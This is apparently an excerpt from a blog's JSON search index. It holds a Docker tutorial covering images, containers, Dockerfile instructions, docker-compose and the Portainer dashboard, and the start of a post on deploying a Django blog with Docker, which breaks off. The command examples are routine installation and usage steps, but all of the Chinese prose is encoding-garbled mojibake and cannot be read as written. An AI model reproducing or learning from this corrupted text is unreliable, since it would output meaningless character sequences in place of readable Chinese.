å¤©å‡†å¤‡æŠŠå†™å¥½çš„Djangoåº”ç”¨é€šè¿‡Dockeréƒ¨ç½²åˆ°æœåŠ¡å™¨ï¼Œæ‰€ä»¥é‡æ–°å¤ä¹ äº†Dockerï¼Œäºæ˜¯å†™äº†æ­¤æ–‡ï¼Œå¸Œæœ›å¯¹æƒ³ä½¿ç”¨Dockerçš„ä½ æœ‰æ‰€å¸®åŠ©ã€‚\n\n## åˆè¯†Docker\n\n> Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼ŒDocker å¯ä»¥è®©å¼€å‘è€…æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªå¯ç§»æ¤çš„å®¹å™¨ä¸­ï¼Œç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„ Linux æœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–ã€‚\n\nDocker çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šé•œåƒï¼ˆimageï¼‰+ å®¹å™¨ï¼ˆcontainerï¼‰+ ä»“åº“ï¼ˆrepositoryï¼‰\n\n**é•œåƒ**æ˜¯ä¸€ä¸ªåªè¯»çš„æ¨¡æ¿ï¼Œå®ƒåŒ…æ‹¬äº†è¿è¡Œå®¹å™¨æ‰€éœ€çš„æ•°æ®ã€‚é•œåƒå¯ä»¥åŒ…å«ä¸€ä¸ªå®Œæ•´çš„ Linux æ“ä½œç¯å¢ƒï¼Œé‡Œé¢ä»…å®‰è£…äº† Python æˆ–è€…å…¶ä»–ç”¨æˆ·éœ€è¦çš„ç¨‹åºã€‚\n\n**å®¹å™¨**æ˜¯ç”±é•œåƒåˆ›å»ºå‡ºæ¥çš„å®ä¾‹ï¼Œç±»ä¼¼è™šæ‹Ÿæœºï¼Œé‡Œé¢å¯ä»¥è¿è¡Œç‰¹å®šçš„åº”ç”¨ï¼Œå¹¶ä¸”å®¹å™¨ä¸å®¹å™¨æ˜¯ç›¸äº’éš”ç¦»çš„ã€‚\n\n**ä»“åº“**æ¦‚å¿µä¸ Git å’Œ Github ç±»ä¼¼ï¼Œå¦‚æœä½ ç”¨è¿‡å®ƒä»¬å°±éå¸¸å®¹æ˜“ç†è§£ã€‚Docker ä½¿ç”¨çš„é»˜è®¤ä»“åº“æ˜¯ç”±å®˜æ–¹ç»´æŠ¤çš„ Docker hub å…¬å…±ä»“åº“ï¼Œä»ä¸­ä¸Šä¼ ã€æ‹‰å–çš„æ“ä½œç±»ä¼¼ Gitã€‚\n\nlinuxä¸‹dockeré»˜è®¤çš„å­˜å‚¨ç›®å½•æ˜¯`/var/lib/docker`\n\nå­˜æ”¾å…ƒæ•°æ®(é¡¹ç›®æºç )`/var/lib/docker/overlay2`\n\n## å®‰è£…Docker\n\n```bash\n$ curl -fsSL get.docker.com -o get-docker.sh\n$ sudo sh get-docker.sh --mirror Aliyun\n```\n\n**æ£€éªŒDockeræ˜¯å¦å®‰è£…æˆåŠŸ**\n\n```python\n$ docker run hello-world\n\nUnable to find image 'hello-world:latest' locally\n......\nlatest: Pulling from library/hello-world\n1b930d010525: Pull complete \n......\nHello from Docker!\nThis message shows that your installation appears to be working correctly.\n......\n```\n\n[å®˜æ–¹æ–‡æ¡£](https://docs.docker.com/engine/install/ubuntu/)\n\n## Dockerå‘½ä»¤\n\n### æŸ¥çœ‹æœ¬åœ°å·²æœ‰é•œåƒ\n\n```bash\n$ docker images\n\nREPOSITORY      TAG        IMAGE ID           CREATED           SIZE\nhello-world     latest     fce289e99eb9       9 months ago      1.84kB\n\n# é•œåƒå           ç‰ˆæœ¬        ID å·             åˆ›å»ºæ—¶é—´           å¤§å°\n```\n\n### æŸ¥çœ‹æœ¬åœ°å·²æœ‰çš„å®¹å™¨\n\n```bash\n$ docker ps -a\n```\n\n### åˆ é™¤é•œåƒ\n\n```bash\n$ docker rmi [images ID]  \n```\n\n### åˆ é™¤å®¹å™¨\n\n```bash\n$ docker container rm [container ID]  \n```\n\n### åœæ­¢å®¹å™¨\n\n```bash\n$ docker container stop [container ID] \n```\n\n### å¯åŠ¨å®¹å™¨\n\n```bash\n$ docker container start [container ID]  \n```\n\n### è¿è¡Œå®¹å™¨\n\n```bash\n$ docker run [options] é•œåƒå /bin/bash\n```\n\n- **-i**: äº¤äº’å¼æ“ä½œã€‚\n- **-t**: ç»ˆç«¯ã€‚\n- **-d:**è®©å®¹å™¨åœ¨åå°è¿è¡Œã€‚\n- **-P:**å°†å®¹å™¨å†…éƒ¨ä½¿ç”¨çš„ç½‘ç»œç«¯å£æ˜ å°„åˆ°æˆ‘ä»¬ä½¿ç”¨çš„ä¸»æœºä¸Šã€‚\n- **-p:**æŒ‡å®šç«¯å£æ˜ å°„ï¼Œæ ¼å¼ä¸ºï¼šä¸»æœº(å®¿ä¸»)ç«¯å£:å®¹å™¨ç«¯å£\n\n[docker run å‘½ä»¤](https://www.runoob.com/docker/docker-run-command.html)\n\nä¾‹å¦‚ï¼š\n\n```bash\ndocker run -d -p 8000:80 --name å®¹å™¨å é•œåƒå #éƒ¨ç½²ä¸€ä¸ªå®¹å™¨ï¼Œå¹¶å°†80ç«¯å£æ˜ å°„åˆ°å®¿ä¸»æœºçš„8000ç«¯å£ä¸Š\n\ndocker run -it ubuntu /bin/bash #ä½¿ç”¨ ubuntu é•œåƒå¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼Œå‚æ•°ä¸ºä»¥å‘½ä»¤è¡Œæ¨¡å¼è¿›å…¥è¯¥å®¹å™¨\n```\n\n## Dockerfile\n\n> Docker å…è®¸é€šè¿‡æ–‡æœ¬æ ¼å¼çš„é…ç½®æ–‡ä»¶æ¥æ„å»ºé•œåƒï¼Œé»˜è®¤åç§°ä¸º **Dockerfile**\n\n### Dockerfile çš„ç»„æˆéƒ¨åˆ†\n\n| éƒ¨åˆ†               | å‘½ä»¤                                                     |\n| ------------------ | -------------------------------------------------------- |\n| åŸºç¡€é•œåƒä¿¡æ¯       | FROM                                                     |\n| ç»´æŠ¤è€…ä¿¡æ¯         | MAINTAINER                                               |\n| é•œåƒæ“ä½œæŒ‡ä»¤       | RUNã€COPYã€ADDã€EXPOSEã€WORKDIRã€ONBUILDã€USERã€VOLUMEç­‰ |\n| å®¹å™¨å¯åŠ¨æ—¶æ‰§è¡ŒæŒ‡ä»¤ | CMDã€ENTRYPOINT                                          |\n\n### FROMï¼šæŒ‡å®šåŸºç¡€é•œåƒ\n\n```bash\n# æŒ‡å®šåŸºç¡€é•œåƒ\nFROM <image>\n\n# æŒ‡å®šä¸€ä¸ªtagç‰ˆæœ¬çš„åŸºç¡€é•œåƒ\nFROM <image>:<tag>                 \n\n#ä¾‹å¦‚ï¼šFROM ubuntu:18.04\n```\n\n### MAINTAINER:å£°æ˜ä½œè€…\n\n```bash\nMAINTAINER [name] [email]\n\n#ä¾‹å¦‚ MAINTAINER jwt \"jianwentaook@163.com\"\n```\n\n### RUNï¼šæ‰§è¡Œå‘½ä»¤\n\n```bash\nRUN <command> \n# shellæ¨¡å¼ï¼Œä»¥#/bin/sh -c command å½¢å¼æ‰§è¡Œ, å¦‚RUN echo hello                                                                                 \nRUN [\"executable\", \"param1\", \"param2\" ... ] \n# execæ¨¡å¼ï¼ŒæŒ‡å®šå…¶ä»–å½¢å¼çš„shellæ¥è¿è¡ŒæŒ‡ä»¤ ,å¦‚RUN [\"/bin/bash\" ,â€œ-câ€,â€œecho  hello\" ]\n\n#ä¾‹å¦‚ï¼šRUN apt-get update && mkdir /code  \n```\n\n### COPYï¼šå¤åˆ¶æ–‡ä»¶\\ç›®å½•\n\n```bash\nCOPY <src> <dest>\n\n#ä¾‹å¦‚ï¼šCOPY index.html /test/\n```\n\n### ADDï¼šé«˜çº§å¤åˆ¶æ–‡ä»¶\n\n```bash\nADD [--chown=<user>:<group>] <src>... <dest>\nADD [--chown=<user>:<group>] [\"<src>\",... \"<dest>\"]\n\n#ä¾‹å¦‚ï¼šADD index.html /var/www/html\n#ä¾‹å¦‚ï¼šADD /var/share/1.txt /var/www/html\n```\n\n### ENVï¼šè®¾ç½®ç¯å¢ƒå˜é‡\n\n```bash\nENV <key> <value>\nENV <key>=<value> ...\n\n#ä¾‹å¦‚ï¼šENV JAVA_HOME /usr/local/jdk1.8.0_45\n#ä¾‹å¦‚ï¼šENV PYTHONUNBUFFERED 1\n```\n\n### VOLUMEï¼šå®šä¹‰åŒ¿åå·\n\n```bash\nVOLUME [\"/data\"]\n\n#ä¾‹å¦‚ï¼šVOLUME /myvol\n#ä¾‹å¦‚ï¼šVOLUME [\"/var/www\", \"/var/log/apache2\", \"/etc/apache2\"]\n```\n\n### EXPOSEï¼šæš´éœ²ç«¯å£\n\n```bash\nEXPOSE <port> [<port>/<protocol>...]\n\n#ä¾‹å¦‚ï¼šEXPOSE 80 443\n#ä¾‹å¦‚ï¼šEXPOSE 80/tcp\n```\n\n### WORKDIRï¼šæŒ‡å®šå·¥ä½œç›®å½•\n\n```bash\nWORKDIR /path\n\n#ä¾‹å¦‚ï¼šWORKDIR /data\n```\n\n### USERï¼šæŒ‡å®šå½“å‰ç”¨æˆ·\n\n```bash\nUSER <user>[:<group>]\nUSER <UID>[:<GID>]\n\n#ä¾‹å¦‚ï¼šUSER jwt\n```\n\n### CMDï¼šå®¹å™¨å¯åŠ¨å‘½ä»¤\n\n```bash\nCMD [\"executable\",\"param1\",\"param2\"] \nCMD [\"param1\",\"param2\"] \nCMD command param1 param2 \n\n#ä¾‹å¦‚ï¼šCMD [\"/usr/bin/wc\",\"--help\"]\n#ä¾‹å¦‚ï¼šCMD echo \"This is a test.\" | wc -\n```\n\n### ENTRYPOINTï¼šå…¥å£ç‚¹\n\n```bash\nENTRYPOINT [\"executable\", \"param1\", \"param2\"]\nENTRYPOINT command param1 param2\n\n#ä¾‹å¦‚ï¼šENTRYPOINT [\"top\", \"-b\"]\n#ä¾‹å¦‚ï¼šENTRYPOINT [\"/usr/sbin/apache2ctl\", \"-D\", \"FOREGROUND\"]\n```\n\n### å®ä¾‹\n\n```bash\n# ä»ä»“åº“æ‹‰å– å¸¦æœ‰ python 3.7 çš„ Linux ç¯å¢ƒ\nFROM python:3.7\n\n# è®¾ç½® python ç¯å¢ƒå˜é‡\nENV PYTHONUNBUFFERED 1\n\n# åˆ›å»º code æ–‡ä»¶å¤¹å¹¶å°†å…¶è®¾ç½®ä¸ºå·¥ä½œç›®å½•\nRUN mkdir /code\nWORKDIR /code\n# æ›´æ–° pip\nRUN pip install pip -U\n# å°† requirements.txt å¤åˆ¶åˆ°å®¹å™¨çš„ code ç›®å½•\nADD requirements.txt /code/\n# å®‰è£…åº“\nRUN pip install -r requirements.txt\n# å°†å½“å‰ç›®å½•å¤åˆ¶åˆ°å®¹å™¨çš„ code ç›®å½•\nADD . /code/\n```\n\n## Docker compose\n\n> åœ¨çº¿ä¸Šç¯å¢ƒä¸­ï¼Œé€šå¸¸ä¸ä¼šå°†é¡¹ç›®çš„æ‰€æœ‰ç»„ä»¶æ”¾åˆ°åŒä¸€ä¸ªå®¹å™¨ä¸­ï¼›æ›´å¥½çš„åšæ³•æ˜¯**æŠŠæ¯ä¸ªç‹¬ç«‹çš„åŠŸèƒ½è£…è¿›å•ç‹¬çš„å®¹å™¨**ï¼Œè¿™æ ·æ–¹ä¾¿å¤ç”¨ã€‚æ¯”å¦‚å°† Django ä»£ç æ”¾åˆ°å®¹å™¨Aï¼Œå°† Mysql æ•°æ®åº“æ”¾åˆ°å®¹å™¨Bï¼Œä»¥æ­¤ç±»æ¨ã€‚\n\nå› æ­¤åŒä¸€ä¸ªæœåŠ¡å™¨ä¸Šæœ‰å¯èƒ½ä¼šè¿è¡Œç€å¤šä¸ªå®¹å™¨ï¼Œå¦‚æœæ¯æ¬¡éƒ½é ä¸€æ¡æ¡æŒ‡ä»¤å»å¯åŠ¨ï¼Œæœªå…ä¹Ÿå¤ªç¹çäº†ã€‚ `Docker-compose` å°±æ˜¯è§£å†³è¿™ä¸ªé—®é¢˜çš„ï¼Œå®ƒç”¨æ¥ç¼–æ’å¤šä¸ªå®¹å™¨ï¼Œå°†å¯åŠ¨å®¹å™¨çš„å‘½ä»¤ç»Ÿä¸€å†™åˆ° `docker-compose.yml` æ–‡ä»¶ä¸­ï¼Œä»¥åæ¯æ¬¡å¯åŠ¨è¿™ä¸€ç»„å®¹å™¨æ—¶ï¼Œåªéœ€è¦ `docker-compose up` å°±å¯ä»¥äº†ã€‚\n\n### Ubantuå®‰è£…Docker compose\n\n[å®˜æ–¹æ–‡æ¡£ ](https://docs.docker.com/compose/install/) | [æŸ¥çœ‹æœ€æ–°ç‰ˆæœ¬](https://github.com/docker/compose/releases)\n\næ ¹æ®æ–°ç‰ˆæœ¬çš„å˜åŒ–è‡ªè¡Œè°ƒæ•´ä¸‹é¢å‘½ä»¤ä¸­çš„ç‰ˆæœ¬æ¥å®‰è£…ï¼š\n\n```bash\n# ä¸‹è½½docker-compose\n$ sudo curl -L \"https://github.com/docker/compose/releases/download/1.25.5/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose\n\n# ç»™docker-composeæ‰§è¡Œæƒé™\n$ chmod +x /usr/local/bin/docker-compose\n\n# æŸ¥çœ‹docker composeç‰ˆæœ¬ï¼Œæµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ\n$ docker-compose  version\ndocker-compose version 1.25.5, build 8a1c60f6\n```\n\n### Docker composeå‘½ä»¤\n\n### å¯åŠ¨å®¹å™¨æœåŠ¡\n\n```bash\n$ docker-compose up\n\n#Ctrl + C å³å¯åœæ­¢å¼€å‘æœåŠ¡å™¨è¿è¡Œ\n```\n\n### åˆ é™¤å®¹å™¨\n\nåœæ­¢æœåŠ¡å™¨åå®é™…ä¸Šå®¹å™¨è¿˜å­˜åœ¨ï¼Œåªæ˜¯åœæ­¢è¿è¡Œäº†è€Œå·²ï¼Œè¾“å…¥ä¸‹é¢å‘½ä»¤å¯ä»¥åˆ é™¤å®¹å™¨\n\n```bash\n$ docker-compose down\n```\n\n### åå°è¿è¡Œå®¹å™¨\n\n```bash\n$ docker-compose up -d\n```\n\n### é‡æ–°æ„å»ºé•œåƒ\n\n```bash\n$ docker-compose build\n```\n\n### å¯åŠ¨å’Œåœæ­¢å·²æœ‰çš„å®¹å™¨ï¼š\n\n```bash\n$ docker-compose start\n$ docker-compose stop\n```\n\n### æŸ¥çœ‹å®¹å™¨æ—¥å¿—\n\n```bash\n$ docker-compose logs\n```\n\n### å®ä¾‹\n\nåœ¨é¡¹ç›®æ ¹ç›®å½•åˆ›å»º **docker-compose.yml** å¹¶å†™å…¥ï¼š\n\n```yml\nversion: \"3\"\nservices:\n  app:\n    restart: always\n    build: .  # 'ç‚¹'ä»£è¡¨å½“å‰ç›®å½•\n    command: \"python3 manage.py runserver 0.0.0.0:8000\"\n    volumes:\n      - .:/code\n    ports:\n      - \"8000:8000\"\n```\n\nè®©æˆ‘ä»¬æ¥åˆ†è§£ä¸€ä¸‹å…¶ä¸­çš„å„é¡¹å«ä¹‰ã€‚\n\n`version` ä»£è¡¨ docker-compose.yml çš„ç‰ˆæœ¬ï¼Œç›®å‰æœ€æ–°ç‰ˆä¸º 3ï¼Œä¸éœ€è¦æ”¹åŠ¨å®ƒã€‚\n\næ¥ç€å®šä¹‰äº†ä¸€ä¸ªåå« `app` çš„å®¹å™¨ã€‚åé¢çš„å†…å®¹éƒ½æ˜¯ `app` å®¹å™¨çš„ç›¸å…³é…ç½®ï¼š\n\n- `restart` ï¼šé™¤æ­£å¸¸å·¥ä½œå¤–ï¼Œå®¹å™¨ä¼šåœ¨ä»»ä½•æ—¶å€™é‡å¯ï¼Œæ¯”å¦‚é­é‡ bugã€è¿›ç¨‹å´©æºƒã€docker é‡å¯ç­‰æƒ…å†µã€‚\n- `build` ï¼šæŒ‡å®šä¸€ä¸ªåŒ…å« **Dockerfile** çš„è·¯å¾„ï¼Œå¹¶é€šè¿‡æ­¤ Dockerfile æ¥æ„å»ºå®¹å™¨é•œåƒã€‚æ³¨æ„é‚£ä¸ª **\".\"** ,ä»£è¡¨å½“å‰ç›®å½•ã€‚\n- `command` ï¼šå®¹å™¨è¿è¡Œæ—¶éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚è¿™é‡Œå°±æ˜¯æˆ‘ä»¬å¾ˆç†Ÿæ‚‰çš„è¿è¡Œå¼€å‘æœåŠ¡å™¨äº†ã€‚\n- `volumes` ï¼š**å·ï¼Œè¿™æ˜¯ä¸ªå¾ˆé‡è¦çš„æ¦‚å¿µã€‚**å‰é¢è¯´è¿‡å®¹å™¨æ˜¯å’Œå®¿ä¸»æœºå®Œå…¨éš”ç¦»çš„ï¼Œä½†æ˜¯æœ‰äº›æ—¶å€™åˆéœ€è¦å°†å…¶è¿é€šï¼›æ¯”å¦‚æˆ‘ä»¬å¼€å‘çš„ Django é¡¹ç›®ä»£ç å¸¸å¸¸ä¼šæ›´æ–°ï¼Œå¹¶ä¸”æ›´æ–°æ—¶è¿˜ä¾èµ–å¦‚ Git ä¹‹ç±»çš„ç¨‹åºï¼Œåœ¨å®¹å™¨é‡Œæ“ä½œå°±æ˜¾å¾—ä¸å¤ªæ–¹ä¾¿ã€‚æ‰€ä»¥å°±æœ‰**å·**ï¼Œå®ƒå®šä¹‰äº†å®¿ä¸»æœºå’Œå®¹å™¨ä¹‹é—´çš„æ˜ å°„ï¼š**\".\"** è¡¨ç¤ºå®¿ä¸»æœºçš„å½“å‰ç›®å½•ï¼Œ**\":\"** ä¸ºåˆ†éš”ç¬¦ï¼Œ\"/code\" è¡¨ç¤ºå®¹å™¨ä¸­çš„ç›®å½•ã€‚å³å®¿ä¸»æœºå½“å‰ç›®å½•å’Œå®¹å™¨çš„ /code ç›®å½•æ˜¯è¿é€šçš„ï¼Œå®¿ä¸»æœºå½“å‰ç›®å½•çš„ Django ä»£ç æ›´æ–°æ—¶ï¼Œå®¹å™¨ä¸­çš„ /code ç›®å½•ä¸­çš„ä»£ç ä¹Ÿç›¸åº”çš„æ›´æ–°äº†ã€‚è¿™æœ‰ç‚¹å„¿åƒæ˜¯åœ¨å®¹å™¨ä¸Šæ‰“äº†ä¸€ä¸ªæ´ï¼ŒæŸç§ç¨‹åº¦ä¸Šä¹Ÿæ˜¯**å®ç”¨æ€§**å’Œ**éš”ç¦»æ€§**çš„ä¸€ç§å¦¥åã€‚\n\n> ä¸¥æ ¼æ„ä¹‰ä¸Šè®²ï¼Œè¿™é‡Œç”¨åˆ°çš„ `.:/code` å¹¶ä¸æ˜¯**å·**ï¼Œè€Œæ˜¯å«**æŒ‚è½½**ï¼Œå®ƒä¸¤æ˜¯æœ‰åŒºåˆ«çš„ï¼Œåªä¸è¿‡ docker-compose å…è®¸å°†æŒ‚è½½å†™åˆ°å·çš„é…ç½®ä¸­ã€‚åé¢ç« èŠ‚ä¼šè®²åˆ°ã€‚\n\n- `ports` ï¼šå®šä¹‰äº†å®¿ä¸»æœºå’Œå®¹å™¨çš„ç«¯å£æ˜ å°„ã€‚å®¹å™¨çš„éš”ç¦»ä¸æ­¢ç¯å¢ƒï¼Œç”šè‡³è¿ç«¯å£éƒ½éš”ç¦»èµ·æ¥äº†ã€‚ä½† web åº”ç”¨ä¸é€šè¿‡ç«¯å£è·Ÿå¤–ç•Œé€šä¿¡å½“ç„¶ä¸è¡Œï¼Œå› æ­¤è¿™é‡Œå®šä¹‰å°†å®¿ä¸»æœºçš„ 8000 ç«¯å£æ˜ å°„åˆ°å®¹å™¨çš„ 8000 ç«¯å£ï¼Œå³è®¿é—®å®¿ä¸»æœºçš„ 8000 ç«¯å£å°±æ˜¯è®¿é—®åˆ°äº†å®¹å™¨çš„ 8000 ç«¯å£ï¼Œä½†è¦ç¡®ä¿ç«¯å£æ²¡æœ‰è¢«å…¶ä»–ç¨‹åºå ç”¨ã€‚\n\n## Docker å¯è§†åŒ–\n\n> Portaineræ˜¯Dockerçš„å›¾å½¢åŒ–ç®¡ç†å·¥å…·ï¼Œæä¾›çŠ¶æ€æ˜¾ç¤ºé¢æ¿ã€åº”ç”¨æ¨¡æ¿å¿«é€Ÿéƒ¨ç½²ã€å®¹å™¨é•œåƒç½‘ç»œæ•°æ®å·çš„åŸºæœ¬æ“ä½œï¼ˆåŒ…æ‹¬ä¸Šä¼ ä¸‹è½½é•œåƒï¼Œåˆ›å»ºå®¹å™¨ç­‰æ“ä½œï¼‰ã€äº‹ä»¶æ—¥å¿—æ˜¾ç¤ºã€å®¹å™¨æ§åˆ¶å°æ“ä½œã€Swarmé›†ç¾¤å’ŒæœåŠ¡ç­‰é›†ä¸­ç®¡ç†å’Œæ“ä½œã€ç™»å½•ç”¨æˆ·ç®¡ç†å’Œæ§åˆ¶ç­‰åŠŸèƒ½ã€‚åŠŸèƒ½ååˆ†å…¨é¢ï¼ŒåŸºæœ¬èƒ½æ»¡è¶³ä¸­å°å‹å•ä½å¯¹å®¹å™¨ç®¡ç†çš„å…¨éƒ¨éœ€æ±‚ã€‚\n\né¡¹ç›®åœ°å€ï¼šhttps://github.com/portainer/portainer\n\nå®˜æ–¹æ–‡æ¡£ï¼šhttps://www.portainer.io/documentation/\n\n### å®‰è£…\n\n```bash\n# æ‹‰å–é•œåƒ\ndocker pull portainer/portainer\n\n# ä¸€é”®éƒ¨ç½²\ndocker volume create portainer_data\ndocker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer\n```\n\n### ä½¿ç”¨\n\næµè§ˆå™¨è®¿é—®`9000`ç«¯å£å³å¯è¿›å…¥åˆ°Portainerç•Œé¢ï¼Œé¦–æ¬¡æ‰“å¼€éœ€è¦è®¾ç½®å¯†ç \n\n> è‹¥æ— æ³•è®¿é—®ï¼Œè¯·åˆ°äº‘æœåŠ¡å™¨æ§åˆ¶å°ï¼Œå¼€å¯9000ç«¯å£\n\n![](https://i.loli.net/2020/05/21/YGp7sS3dzCaubMo.png)\n\nå•æœºç‰ˆæœ¬é€‰æ‹©`Local`ï¼Œç‚¹å‡»Connectå³å¯è¿æ¥åˆ°æœ¬åœ°docker\n\n![](https://i.loli.net/2020/05/21/AC8XVlY4utNw9mS.png)\n\nç™»å½•åæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹æœåŠ¡å™¨ä¸Šå„ä¸ªé•œåƒã€å®¹å™¨ã€ç½‘ç»œã€**Volume** ç­‰ä¿¡æ¯ï¼Œå¹¶å¯ä»¥å¯¹å®ƒä»¬è¿›è¡Œç®¡ç†ã€‚\n![](https://i.loli.net/2020/05/21/DJmZEe2btkzcsMP.png)\n\n![](https://i.loli.net/2020/05/21/cCk57HPUdYDXxms.png)\n\nåœ¨é¡µé¢ä¸Šå°±å¯ä»¥ç›´æ¥è¿›è¡Œå®¹å™¨çš„åˆ›å»ºã€å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤ç­‰æ“ä½œ\n\n![](https://i.loli.net/2020/05/21/hRBW54fCcum1abA.png)\n\nå¯æŸ¥çœ‹å®¹å™¨è¯¦ç»†ä¿¡æ¯ï¼Œè¿˜å¯æŸ¥çœ‹ **log** æ—¥å¿—ï¼Œç”šè‡³è¿›å…¥å®¹å™¨æ‰§è¡Œå‘½ä»¤ã€‚\n\n![](https://i.loli.net/2020/05/21/qKBcjLRifZ6Ez3s.png)\n\n### åˆ›å»ºä¸€ä¸ªå®¹å™¨\n\nåœ¨ **Containers** é¡µé¢ä¸­ï¼Œç‚¹å‡»å³ä¸Šè§’çš„â€œ**Add container**â€ æŒ‰é’®ã€‚\n\næ¥ç€å¡«å†™å¥½å®¹å™¨åã€é•œåƒåã€ç«¯å£æ˜ å°„ç­‰ç›¸å…³ä¿¡æ¯åï¼Œç‚¹å‡»ä¸‹æ–¹çš„â€œ**Deploy the container**â€ åä¾¿ä¼šå¼€å§‹è‡ªåŠ¨æ‹‰å–é•œåƒå¯åŠ¨å®¹å™¨ã€‚\n\nå‚è€ƒï¼š[Portainer - Dockerçš„å¯è§†åŒ–ç®¡ç†å·¥å…·ä½¿ç”¨è¯¦è§£](https://www.hangge.com/blog/cache/detail_2597.html)","tags":["Docker"],"categories":["Tools"]},{"title":"åŸºäºDjangoçš„åšå®¢å¼€å‘","url":"/posts/31757.html","content":"## å‰è¨€\n\næ‰“ç®—å¯†ç å­¦é¡¹ç›®æ”¹ç”¨Djangoæ¥å®Œæˆï¼Œæ‰€ä»¥æœ€è¿‘ä¸€æ®µæ—¶é—´éƒ½åœ¨å­¦ä¹ Django,å­¦äº†ä¹Ÿæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œæƒ³è¦æ‰¾ä¸ªç»ƒæ‰‹çš„é¡¹ç›®ï¼Œç½‘ä¸Šå¤§éƒ¨åˆ†å…³äºDjangoç»ƒæ‰‹çš„é¡¹ç›®éƒ½æ˜¯å†™åšå®¢ç³»ç»Ÿï¼Œåˆšå¥½åˆçœ‹åˆ°å›½å…‰å¤§ä½¬ç”¨Djangoæ”¹å†™äº†ä»–çš„åšå®¢ï¼Œäºæ˜¯è‡ªå·±ä¹Ÿæ¥å®ç°ä¸€å“ˆã€‚\n\n## ç®€ä»‹\n\né¡¹ç›®åœ°å€ï¼šhttps://github.com/jwt1399/Django_Blogï¼Œéº»çƒ¦ç»™ä¸ª Star å§ï¼Œè°¢è°¢ï¼\n\nåå°ï¼š[SimpleUi](https://simpleui.88cto.com/simpleui)\n\nDjangoï¼š[Django 3.0.5](https://www.djangoproject.com/)       \n\nPythonï¼špython3.7\n\nğŸ‘‡ ğŸ‘‡ ğŸ‘‡ ğŸ‘‡ ğŸ‘‡ ğŸ‘‡ ğŸ‘‡ ğŸ‘‡ ğŸ‘‡\n\nğŸ‘‡     éƒ¨ç½²æ–¹æ³•åœ¨æ–‡ç« æœ€å     ğŸ‘‡\n\n ğŸ‘‡ ğŸ‘‡ ğŸ‘‡ ğŸ‘‡ ğŸ‘‡ ğŸ‘‡ ğŸ‘‡ ğŸ‘‡ğŸ‘‡\n\n## å‰ç«¯é¡µé¢å±•ç¤º\n\n### é¦–é¡µ\n\n![](https://i.loli.net/2020/04/30/v81iAjyXfaOTDEM.png)\n\n![](https://i.loli.net/2020/04/30/9PBT6RwqzvruUAL.png)\n\n### æ–‡ç« è¯¦æƒ…\n\n![](https://i.loli.net/2020/04/30/oZyrvMUiu1fQctK.png)\n\n### è¯„è®º\n\n![](https://i.loli.net/2020/04/30/S4Q1pJRoieqyOsU.png)\n\n### å‹é“¾\n\n![](https://i.loli.net/2020/04/30/52SQMVl4IwUtDcT.png)\n\n### æ–‡ç« åˆ†ç±»è¯¦æƒ…é¡µ\n\n![](https://i.loli.net/2020/04/30/ubRrh4qinAV3ogL.png)\n\n### å½’ç±»é¡µ\n\n![](https://i.loli.net/2020/04/30/pEIf5lxVhwMiFDA.png)\n\n### å…³äºé¡µ\n\n![](https://i.loli.net/2020/04/30/vXOc26i3gYtrITo.png)\n\n## åå°é¡µé¢å±•ç¤º\n\n### åå°ç™»å½•é¡µ\n\n![](https://i.loli.net/2020/04/30/FsnOIrijYU5cCmy.png)\n\n### åå°é¦–é¡µ\n\n![](https://i.loli.net/2020/04/30/96yhb4T3nNKsR5G.png)\n\n### æ–‡ç« ç®¡ç†\n\n![](https://i.loli.net/2020/04/30/UR6I2pTXleYy9Sf.png)\n\n### åˆ†ç±»\n\n![](https://i.loli.net/2020/04/30/HJwTCU42liPXZRj.png)\n\n### å‹é“¾\n\n![](https://i.loli.net/2020/04/30/rDlRJpN2yALYz3M.png)\n\n### å…³äºè®¾ç½®\n\n![](https://i.loli.net/2020/04/30/UtfSdoZbGvOwAhn.png)\n\n### ç½‘ç«™è®¾ç½®\n\n![](https://i.loli.net/2020/04/30/VAJtn5DxIYjiNH6.png)\n\n## éƒ¨ç½²æ–¹æ³•  ğŸ‘‡\n\n### å®‰è£…Docker\n\n[å®˜æ–¹æ–‡æ¡£](https://docs.docker.com/engine/install/ubuntu/)\n\n```bash\n$ curl -fsSL get.docker.com -o get-docker.sh\n$ sudo sh get-docker.sh --mirror Aliyun\n```\n\n**æ£€éªŒDockeræ˜¯å¦å®‰è£…æˆåŠŸ**\n\n```python\n$ docker run hello-world\n\nUnable to find image 'hello-world:latest' locally\n...\nlatest: Pulling from library/hello-world\n1b930d010525: Pull complete \n...\n\nHello from Docker!\nThis message shows that your installation appears to be working correctly.\n...\n```\n\n### å®‰è£…Docker compose\n\n[å®˜æ–¹æ–‡æ¡£ ](https://docs.docker.com/compose/install/) | [æŸ¥çœ‹æœ€æ–°ç‰ˆæœ¬](https://github.com/docker/compose/releases)\n\næ ¹æ®æ–°ç‰ˆæœ¬çš„å˜åŒ–è‡ªè¡Œè°ƒæ•´ä¸‹é¢å‘½ä»¤ä¸­çš„ç‰ˆæœ¬æ¥å®‰è£…ï¼š\n\n```bash\n# ä¸‹è½½docker-compose\n$ sudo curl -L \"https://github.com/docker/compose/releases/download/1.25.5/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose\n\n# ç»™docker-composeæ‰§è¡Œæƒé™\n$ chmod +x /usr/local/bin/docker-compose\n\n# æŸ¥çœ‹docker composeç‰ˆæœ¬ï¼Œæµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ\n$ docker-compose  version\ndocker-compose version 1.25.5, build 8a1c60f6\ndocker-py version: 4.1.0\nCPython version: 3.7.5\nOpenSSL version: OpenSSL 1.1.0l  10 Sep 2019\n```\n\n### 